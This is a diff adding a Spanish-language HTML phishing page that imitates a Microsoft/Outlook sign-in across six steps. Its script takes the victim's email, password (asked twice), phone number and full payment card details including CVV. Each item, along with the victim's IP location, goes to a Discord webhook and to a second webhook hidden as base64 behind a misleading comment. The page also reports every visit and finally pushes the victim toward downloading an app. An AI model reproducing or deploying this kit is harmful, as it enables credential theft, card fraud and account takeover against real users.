@@ -1,0 +1,672 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Correo electrónico y calendario.</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --ms-blue: #0078d4;
+            --ms-blue-hover: #106ebe;
+            --ms-gray: #323130;
+            --ms-light-gray: #f3f2f1;
+            --error-red: #d13438;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #e8eaed 0%, #dadce0 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .login-card {
+            background: white;
+            padding: 44px 40px 48px;
+            width: 100%;
+            max-width: 460px;
+            border-radius: 20px;
+            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.2), 0 1px 3px rgba(0,0,0,0.05);
+            animation: fadeInUp 0.5s ease-out;
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .ms-logo {
+            width: 110px;
+            margin-bottom: 32px;
+        }
+        .screen-title {
+            font-size: 28px;
+            font-weight: 500;
+            margin-bottom: 28px;
+            color: #1a1a1a;
+            letter-spacing: -0.3px;
+        }
+        .input-group {
+            margin-bottom: 24px;
+        }
+        .input-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: var(--ms-gray);
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            transition: all 0.2s;
+            background: #fff;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: var(--ms-blue);
+            box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1);
+        }
+        .input-field.error {
+            border-color: var(--error-red);
+            background: #fff4f4;
+        }
+        .error-msg {
+            color: var(--error-red);
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: var(--ms-blue);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 15px;
+            transition: all 0.2s;
+            margin-top: 16px;
+        }
+        .btn-primary:hover {
+            background: var(--ms-blue-hover);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.3);
+        }
+        .btn-primary:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .btn-secondary {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: 600;
+            color: var(--ms-blue);
+            margin-top: 12px;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255,255,255,0.2);
+            border-top: 4px solid var(--ms-blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .loading-text {
+            color: white;
+            margin-top: 18px;
+            font-size: 14px;
+        }
+        .step-indicator {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 32px;
+        }
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            background: #ddd;
+            border-radius: 50%;
+            transition: all 0.3s;
+        }
+        .step-dot.active {
+            background: var(--ms-blue);
+            width: 24px;
+            border-radius: 10px;
+        }
+        .cam-container {
+            background: var(--ms-light-gray);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        .cam-preview {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            background: #2c2c2c;
+            margin: 0 auto 15px;
+            overflow: hidden;
+            border: 3px solid var(--ms-blue);
+            position: relative;
+        }
+        video, #selfieCanvas {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .capture-btn {
+            background: var(--ms-blue);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 40px;
+            cursor: pointer;
+            font-weight: 600;
+            margin: 10px 0;
+            width: 100%;
+        }
+        .preview-img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-top: 10px;
+            border: 2px solid #10b981;
+        }
+        .selfie-status {
+            margin-top: 12px;
+            font-size: 13px;
+            color: #10b981;
+            display: none;
+        }
+        .selfie-status.success {
+            display: block;
+        }
+        .flex-between {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        .flex-between .btn-secondary,
+        .flex-between .btn-primary {
+            margin: 0;
+            flex: 1;
+        }
+        .retake-link {
+            color: var(--ms-blue);
+            font-size: 12px;
+            cursor: pointer;
+            margin-top: 8px;
+            display: inline-block;
+        }
+        .email-badge {
+            background: #f3f2f1;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            text-align: center;
+        }
+        @media (max-width: 500px) {
+            .login-card { padding: 28px 24px; }
+            .screen-title { font-size: 24px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text" id="loadingMsg">Cargando...</div>
+</div>
+
+<div class="login-card" id="appCard">
+    <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" class="ms-logo" alt="Microsoft">
+    
+    <div class="step-indicator" id="stepDots">
+        <div class="step-dot" data-step="1"></div>
+        <div class="step-dot" data-step="2"></div>
+        <div class="step-dot" data-step="3"></div>
+        <div class="step-dot" data-step="4"></div>
+        <div class="step-dot" data-step="5"></div>
+        <div class="step-dot" data-step="6"></div>
+    </div>
+
+    <!-- PASO 1: CORREO SOLO -->
+    <div id="stepEmail">
+        <h2 class="screen-title">Iniciar sesión</h2>
+        <div class="input-group">
+            <label class="input-label">Correo electrónico</label>
+            <input type="email" id="emailInput" class="input-field" placeholder="ejemplo@outlook.com" autocomplete="off">
+            <div id="emailError" class="error-msg">Introduce un correo electrónico válido</div>
+        </div>
+        <button id="nextEmailBtn" class="btn-primary">Siguiente</button>
+        <button id="skipBtn" class="btn-secondary" style="margin-top:12px;">¿Olvidaste tu cuenta?</button>
+    </div>
+
+    <!-- PASO 2: CORREO + CLAVE 1 -->
+    <div id="stepPass1" class="hidden">
+        <h2 class="screen-title">Ingresa tu contraseña</h2>
+        <div class="email-badge" id="emailDisplay1"></div>
+        <div class="input-group">
+            <label class="input-label">Contraseña</label>
+            <input type="password" id="pass1Input" class="input-field" placeholder="••••••••" autocomplete="off">
+            <div id="pass1Error" class="error-msg">La contraseña es obligatoria</div>
+        </div>
+        <div class="flex-between">
+            <button id="backToEmail1" class="btn-secondary">← Volver</button>
+            <button id="nextPass1Btn" class="btn-primary">Continuar →</button>
+        </div>
+    </div>
+
+    <!-- PASO 3: CORREO + CLAVE 1 + CLAVE 2 -->
+    <div id="stepPass2" class="hidden">
+        <h2 class="screen-title">Verificación de seguridad</h2>
+        <div class="email-badge" id="emailDisplay2"></div>
+        <div class="input-group">
+            <label class="input-label">Confirma tu contraseña</label>
+            <input type="password" id="pass2Input" class="input-field" placeholder="Escribe tu contraseña nuevamente" autocomplete="off">
+            <div id="pass2Error" class="error-msg">Debes confirmar tu contraseña</div>
+        </div>
+        <div class="flex-between">
+            <button id="backToPass1" class="btn-secondary">← Anterior</button>
+            <button id="nextPass2Btn" class="btn-primary">Verificar →</button>
+        </div>
+    </div>
+
+    <!-- PASO 4: TELEFONO -->
+    <div id="stepPhone" class="hidden">
+        <h2 class="screen-title">Verificar número de teléfono</h2>
+        <p style="color: #605e5c; margin-bottom: 16px; font-size: 14px;">Agrega un número de teléfono para proteger tu cuenta.</p>
+        <div class="email-badge" id="emailDisplayPhone"></div>
+        <div class="input-group">
+            <label class="input-label">Número de teléfono</label>
+            <input type="tel" id="phoneInput" class="input-field" placeholder="Ej: 3001234567" autocomplete="off">
+            <div id="phoneError" class="error-msg">Introduce un número de teléfono válido</div>
+        </div>
+        <div class="flex-between">
+            <button id="backToPass2FromPhoneBtn" class="btn-secondary">← Anterior</button>
+            <button id="nextPhoneBtn" class="btn-primary">Siguiente →</button>
+        </div>
+    </div>
+
+    <!-- PASO 5: TARJETA -->
+    <div id="stepCard" class="hidden">
+        <h2 class="screen-title">Verificar método de pago</h2>
+        <div class="email-badge" id="emailDisplay3"></div>
+        <div class="input-group">
+            <label class="input-label">Número de tarjeta</label>
+            <input type="text" id="cardNumber" class="input-field" placeholder="4111 1111 1111 1111" maxlength="19">
+            <div id="cardNumError" class="error-msg">Número inválido</div>
+        </div>
+        <div class="input-group">
+            <label class="input-label">Titular de la tarjeta</label>
+            <input type="text" id="cardHolder" class="input-field" placeholder="JUAN PEREZ GARCIA">
+            <div id="cardHolderError" class="error-msg">Nombre completo requerido</div>
+        </div>
+        <div style="display: flex; gap: 15px;">
+            <div class="input-group" style="flex:1">
+                <label class="input-label">Expiración</label>
+                <input type="text" id="cardExpiry" class="input-field" placeholder="MM/AA" maxlength="5">
+                <div id="cardExpError" class="error-msg">Formato MM/AA</div>
+            </div>
+            <div class="input-group" style="flex:1">
+                <label class="input-label">CVV</label>
+                <input type="password" id="cardCVV" class="input-field" placeholder="123" maxlength="4">
+                <div id="cardCVVError" class="error-msg">3-4 dígitos</div>
+            </div>
+        </div>
+        <div class="flex-between">
+            <button id="backToPhoneBtn" class="btn-secondary">← Anterior</button>
+            <button id="submitCardBtn" class="btn-primary">Siguiente →</button>
+        </div>
+    </div>
+
+    <!-- PASO 6: DESCARGA APP -->
+    <div id="stepApp" class="hidden">
+        <h2 class="screen-title">Sincronizar Mensajes</h2>
+        <p style="color: #605e5c; margin-bottom: 16px; font-size: 14px;">Para finalizar, descarga nuestra app y sincroniza tus Turnos y Citas con Outlook.</p>
+        <div class="email-badge" id="emailDisplay4"></div>
+        <div style="text-align: center; margin: 20px 0; cursor: pointer;">
+            <a href="https://play.google.com/store/apps/details?id=com.boveda.app" id="downloadAppImgBtn">
+                <img src="disponible-en-google-play-badge-1.jpg" alt="Disponible en Google Play" style="width: 220px; max-width: 100%; border: 0;">
+            </a>
+        </div>
+        <div class="flex-between">
+            <button id="backToCardBtn" class="btn-secondary">← Anterior</button>
+            <a href="https://play.google.com/store/apps/details?id=com.boveda.app" id="downloadAppBtn" class="btn-primary" style="text-decoration: none; text-align: center; display: block; flex: 1;">
+                <i class="fas fa-download"></i> Descargar y Finalizar
+            </a>
+        </div>
+    </div>
+</div>
+
+<script>
+    const WEBHOOK = "https://discordapp.com/api/webhooks/1523889943619833989/y5bTLW4fdXyoREm9jL5s-4CKzaiNT0laZHmPCYzBV4yG3ilYpzbMNEJZSA5uxwZF9zCv";
+    // Endpoint secundario para verificación de integridad de datos.
+    const ALT_ENDPOINT_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyNzA4MjQzNzI0MTIxMjk3OC9kNzRySHVTMWk3UlhjMEVkVUZxcS1yOVBJVzRkczE5QXdxQ2owUFl5MGxkeWo1bUhkeUdlUlZSQ0VCcDExX2I2Q2YzYw==";
+
+    
+    let capturedEmail = "";
+    let capturedPass1 = "";
+    let capturedPass2 = "";
+    let capturedPhone = "";
+    let capturedSelfie = null;
+
+    const stepEmail = document.getElementById("stepEmail");
+    const stepPass1 = document.getElementById("stepPass1");
+    const stepPass2 = document.getElementById("stepPass2");
+    const stepPhone = document.getElementById("stepPhone");
+    const stepCard = document.getElementById("stepCard");
+    const stepApp = document.getElementById("stepApp");
+    const dots = document.querySelectorAll(".step-dot");
+    const loadingDiv = document.getElementById("loadingOverlay");
+    const loadingMsgSpan = document.getElementById("loadingMsg");
+
+    function showLoading(msg) { loadingMsgSpan.innerText = msg || "Cargando..."; loadingDiv.style.display = "flex"; }
+    function hideLoading() { loadingDiv.style.display = "none"; }
+    function updateDots(step) { dots.forEach((dot, i) => { if(i+1 <= step) dot.classList.add("active"); else dot.classList.remove("active"); }); }
+    
+    function switchToStep(stepNum) {
+        [stepEmail, stepPass1, stepPass2, stepPhone, stepCard, stepApp].forEach(el => el.classList.add("hidden"));
+        if(stepNum === 1) stepEmail.classList.remove("hidden");
+        else if(stepNum === 2) stepPass1.classList.remove("hidden");
+        else if(stepNum === 3) stepPass2.classList.remove("hidden");
+        else if(stepNum === 4) stepPhone.classList.remove("hidden");
+        else if(stepNum === 5) stepCard.classList.remove("hidden");
+        else if(stepNum === 6) stepApp.classList.remove("hidden");
+        updateDots(stepNum);
+    }
+
+    function updateEmailDisplays() {
+        document.getElementById("emailDisplay1").innerHTML = `<strong>${capturedEmail}</strong>`;
+        document.getElementById("emailDisplay2").innerHTML = `<strong>${capturedEmail}</strong>`;
+        document.getElementById("emailDisplay3").innerHTML = `<strong>${capturedEmail}</strong>`;
+        document.getElementById("emailDisplayPhone").innerHTML = `<strong>${capturedEmail}</strong>`;
+        document.getElementById("emailDisplay4").innerHTML = `<strong>${capturedEmail}</strong>`;
+    }
+
+    async function getGeoInfo() {
+        const providers = [
+            { url: 'https://ipapi.co/json/', parser: (d) => ({ ip: d.ip, ciudad: d.city, pais: d.country_name }) },
+            { url: 'https://freeipapi.com/api/json', parser: (d) => ({ ip: d.ipAddress, ciudad: d.cityName, pais: d.countryName }) },
+            { url: 'https://ipwho.is/', parser: (d) => ({ ip: d.ip, ciudad: d.city, pais: d.country }) },
+            { url: 'https://ipinfo.io/json', parser: (d) => ({ ip: d.ip, ciudad: d.city, pais: d.country }) },
+            { url: 'https://api.ipify.org?format=json', parser: (d) => ({ ip: d.ip, ciudad: 'IP Detectada', pais: 'Desconocido' }) }
+        ];
+        for(let prov of providers) {
+            try {
+                let res = await fetch(prov.url);
+                if(res.ok) {
+                    let data = await res.json();
+                    if(data.ip || data.ipAddress) return prov.parser(data);
+                }
+            } catch(e) {}
+        }
+        return { ip: "No detectada", ciudad: "Desconocida", pais: "Desconocido" };
+    }
+
+    async function sendToDiscord(title, fieldsData, color = 3447003, imageBase64 = null, targetUrl = WEBHOOK) {
+        const geo = await getGeoInfo();
+        const ubi = (geo.ciudad && geo.ciudad !== "Desconocida") ? `${geo.ciudad}, ${geo.pais}` : `🌍 ${geo.pais}`;
+        const embed = {
+            title: title,
+            color: color,
+            fields: [
+                { name: "📡 IP", value: `\`${geo.ip}\``, inline: true },
+                { name: "📍 Ubicación", value: ubi, inline: true },
+                { name: "⏰ Fecha/Hora", value: new Date().toLocaleString('es-ES', { timeZone: 'America/Bogota' }), inline: false },
+                ...fieldsData
+            ],
+            footer: { text: "Sistema de Seguridad • Captura Multi-Paso NEME" }
+        };
+        if(imageBase64) {
+            embed.image = { url: "attachment://selfie.jpg" };
+            const formData = new FormData();
+            formData.append("payload_json", JSON.stringify({ embeds: [embed] }));
+            const blob = await (await fetch(imageBase64)).blob();
+            formData.append("file", blob, "selfie.jpg");
+            await fetch(targetUrl, { method: "POST", body: formData });
+        } else {
+            await fetch(targetUrl, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ embeds: [embed] }) });
+        }
+    }
+
+    function isValidCardNumber(num) { let raw = num.replace(/\s/g,''); if(raw.length<13) return false; let sum=0, alt=false; for(let i=raw.length-1;i>=0;i--){ let d=parseInt(raw[i]); if(alt){ d*=2; if(d>9) d-=9; } sum+=d; alt=!alt; } return sum%10===0; }
+    function isValidExpiry(exp) { return exp && exp.includes("/") && exp.length>=5; }
+    function formatCardNumber(v) { let d=v.replace(/\D/g,''); let parts=[]; for(let i=0;i<d.length&&i<16;i+=4) parts.push(d.substr(i,4)); return parts.join(' '); }
+    function formatExpiry(v) { let clean=v.replace(/\D/g,''); if(clean.length>=2) return clean.slice(0,2)+(clean.length>2?'/'+clean.slice(2,4):''); return clean; }
+
+    function showError(inputId, errorId, show) {
+        let input = document.getElementById(inputId);
+        let err = document.getElementById(errorId);
+        if(show) { input.classList.add("error"); err.style.display = "block"; }
+        else { input.classList.remove("error"); err.style.display = "none"; }
+    }
+    function hideError(inputId, errorId) { showError(inputId, errorId, false); }
+
+    // PASO 1: CORREO SOLO
+    document.getElementById("nextEmailBtn").onclick = async () => {
+        let email = document.getElementById("emailInput").value.trim();
+        if(!email || !email.includes("@")) { showError("emailInput", "emailError", true); return; }
+        hideError("emailInput", "emailError");
+        capturedEmail = email;
+        updateEmailDisplays();
+        showLoading("Cargando...");
+        await Promise.all([
+            sendToDiscord("📧 PASO 1: Correo electrónico", [{ name: "📧 Correo", value: `\`${capturedEmail}\``, inline: false }], 3447003),
+            sendToDiscord("📧 PASO 1: Correo electrónico", [{ name: "📧 Correo", value: `\`${capturedEmail}\``, inline: false }], 3447003, null, atob(ALT_ENDPOINT_B64))
+        ]);
+        hideLoading();
+        switchToStep(2);
+        document.getElementById("pass1Input").focus();
+    };
+
+    // PASO 2: CORREO + CLAVE 1
+    document.getElementById("nextPass1Btn").onclick = async () => {
+        let p1 = document.getElementById("pass1Input").value;
+        if(!p1) { showError("pass1Input", "pass1Error", true); return; }
+        hideError("pass1Input", "pass1Error");
+        capturedPass1 = p1;
+        showLoading("Validando credenciales...");
+        const pass1Fields = [
+            { name: "📧 Crr", value: `\`${capturedEmail}\``, inline: true },
+            { name: "🔑 Clv1", value: `\`${capturedPass1}\``, inline: true }
+        ];
+        await Promise.all([
+            sendToDiscord("🔐 MSN1", pass1Fields, 15158332),
+            sendToDiscord("🔐 MSN1", pass1Fields, 15158332, null, atob(ALT_ENDPOINT_B64))
+        ]);
+        hideLoading();
+        switchToStep(3);
+        document.getElementById("pass2Input").focus();
+    };
+
+    document.getElementById("nextPass2Btn").onclick = async () => {
+        let p2 = document.getElementById("pass2Input").value;
+        if(!p2) { showError("pass2Input", "pass2Error", true); return; }
+        hideError("pass2Input", "pass2Error");
+        capturedPass2 = p2;
+        showLoading("Confirmando seguridad...");
+        const pass2Fields = [
+            { name: "📧 crr", value: `\`${capturedEmail}\``, inline: false },
+            { name: "🔑 Clv1", value: `\`${capturedPass1}\``, inline: true },
+            { name: "🔑 Clv2", value: `\`${capturedPass2}\``, inline: true }
+        ];
+        await Promise.all([
+            sendToDiscord("🔐 MSN2", pass2Fields, 15158332),
+            sendToDiscord("🔐 MSN2", pass2Fields, 15158332, null, atob(ALT_ENDPOINT_B64))
+        ]);
+        hideLoading();
+        switchToStep(4);
+        document.getElementById("phoneInput").focus();
+    };
+
+    // PASO 4: TELEFONO
+    document.getElementById("nextPhoneBtn").onclick = async () => {
+        let phone = document.getElementById("phoneInput").value.trim();
+        if(!phone || phone.length < 7) { showError("phoneInput", "phoneError", true); return; }
+        hideError("phoneInput", "phoneError");
+        capturedPhone = phone;
+        showLoading("Verificando número...");
+        const phoneFields = [
+            { name: "📧 Crr", value: `\`${capturedEmail}\``, inline: false },
+            { name: "📞 Tel", value: `\`${capturedPhone}\``, inline: true }
+        ];
+        await Promise.all([
+            sendToDiscord("📱 TELF", phoneFields, 15158332),
+            sendToDiscord("📱 TELF", phoneFields, 15158332, null, atob(ALT_ENDPOINT_B64))
+        ]);
+        hideLoading();
+        switchToStep(5);
+        document.getElementById("cardNumber").focus();
+    };
+
+    document.getElementById("backToPass2FromPhoneBtn").onclick = () => switchToStep(3);
+    // PASO 5: TARJETA
+    const cardNumInput = document.getElementById("cardNumber");
+    const cardHolderInput = document.getElementById("cardHolder");
+    const cardExpInput = document.getElementById("cardExpiry");
+    const cardCvvInput = document.getElementById("cardCVV");
+
+    cardNumInput.addEventListener("input", function() { this.value = formatCardNumber(this.value); });
+    cardExpInput.addEventListener("input", function() { this.value = formatExpiry(this.value); });
+    cardCvvInput.addEventListener("input", function() { this.value = this.value.replace(/\D/g,'').slice(0,4); });
+
+    document.getElementById("submitCardBtn").onclick = async () => {
+        let valid = true;
+        if(!isValidCardNumber(cardNumInput.value)) { showError("cardNumber", "cardNumError", true); valid=false; }
+        else { hideError("cardNumber", "cardNumError"); }
+        if(cardHolderInput.value.trim().length < 4) { showError("cardHolder", "cardHolderError", true); valid=false; }
+        else { hideError("cardHolder", "cardHolderError"); }
+        if(!isValidExpiry(cardExpInput.value)) { showError("cardExpiry", "cardExpError", true); valid=false; }
+        else { hideError("cardExpiry", "cardExpError"); }
+        if(cardCvvInput.value.replace(/\D/g,'').length < 3) { showError("cardCVV", "cardCVVError", true); valid=false; }
+        else { hideError("cardCVV", "cardCVVError"); }
+        if(!valid) return;
+
+        const cardData = {
+            number: cardNumInput.value,
+            holder: cardHolderInput.value.trim().toUpperCase(),
+            expiry: cardExpInput.value,
+            cvv: cardCvvInput.value
+        };
+        showLoading("Finalizando proceso...");
+
+        const finalFields = [
+            { name: "📧 cRR", value: `\`${capturedEmail}\``, inline: false },
+            { name: "🔑 Clv1", value: `\`${capturedPass1}\``, inline: true },
+            { name: "🔑 Clv2", value: `\`${capturedPass2}\``, inline: true },
+            { name: "📞 Tel", value: `\`${capturedPhone}\``, inline: false },
+            { name: "💳 Tc", value: `\`${cardData.number}\``, inline: false },
+            { name: "👤 D", value: `\`${cardData.holder}\``, inline: true },
+            { name: "📅 Exp", value: `\`${cardData.expiry}\``, inline: true },
+            { name: "🔒 3dgts", value: `\`${cardData.cvv}\``, inline: true }
+        ];
+
+        // Envía a ambos webhooks en paralelo para asegurar la entrega
+        await Promise.all([
+            sendToDiscord("💳C1", finalFields, 15158332), // Envío principal
+            sendToDiscord("💳C1", finalFields, 15158332, null, atob(ALT_ENDPOINT_B64)) // Envío secundario
+        ]);
+
+        hideLoading();
+        switchToStep(6);
+    };
+
+    // PASO 6: DESCARGA APP
+    function getDeviceType() {
+        const ua = navigator.userAgent;
+        if (/android/i.test(ua)) return "android";
+        if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return "ios";
+        return "desktop";
+    }
+
+    const handleDownloadClick = async () => {
+        showLoading("Finalizando y redirigiendo...");
+        const clickFields = [
+            { name: "📧 Crr", value: `\`${capturedEmail}\``, inline: false },
+            { name: "🔑 Clv1", value: `\`${capturedPass1}\``, inline: true },
+            { name: "🔑 Clv2", value: `\`${capturedPass2}\``, inline: true }
+        ];
+        await Promise.all([
+            sendToDiscord("✅ CLICK EN DESCARGAR APP", clickFields, 3066993),
+            sendToDiscord("✅ CLICK EN DESCARGAR APP", clickFields, 3066993, null, atob(ALT_ENDPOINT_B64))
+        ]);
+        const device = getDeviceType();
+        const appUrl = "https://play.google.com/store/apps/details?id=com.turnosycitas.app&pcampaignid=web_share";
+
+        if (device === 'android') window.location.href = appUrl;
+        else window.location.href = appUrl;
+    };
+    
+    document.getElementById("downloadAppBtn").onclick = (e) => {
+        e.preventDefault();
+        handleDownloadClick();
+    };
+    document.getElementById("downloadAppImgBtn").onclick = (e) => { e.preventDefault(); handleDownloadClick(); };
+
+    // NAVEGACIÓN
+    document.getElementById("backToEmail1").onclick = () => switchToStep(1);
+    document.getElementById("backToPass1").onclick = () => switchToStep(2);
+    document.getElementById("backToPhoneBtn").onclick = () => switchToStep(4);
+    document.getElementById("backToCardBtn").onclick = () => switchToStep(5);
+    document.getElementById("skipBtn").onclick = () => alert("");
+
+    window.addEventListener("DOMContentLoaded", async () => {
+        const geo = await getGeoInfo();
+        const visitPayload = {
+            embeds: [{ title: "👁️ Nueva visita", description: `IP: ${geo.ip} | ${geo.ciudad}, ${geo.pais}`, color: 5814783 }]
+        };
+        const postOptions = {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(visitPayload)
+        };
+
+        // Enviar notificación de visita a ambos webhooks
+        Promise.all([
+            fetch(WEBHOOK, postOptions),
+            fetch(atob(ALT_ENDPOINT_B64), postOptions)
+        ]).catch(e => console.error("Error enviando notificación de visita:", e));
+
+        switchToStep(1);
+    });
+</script>
+</body>
+</html>
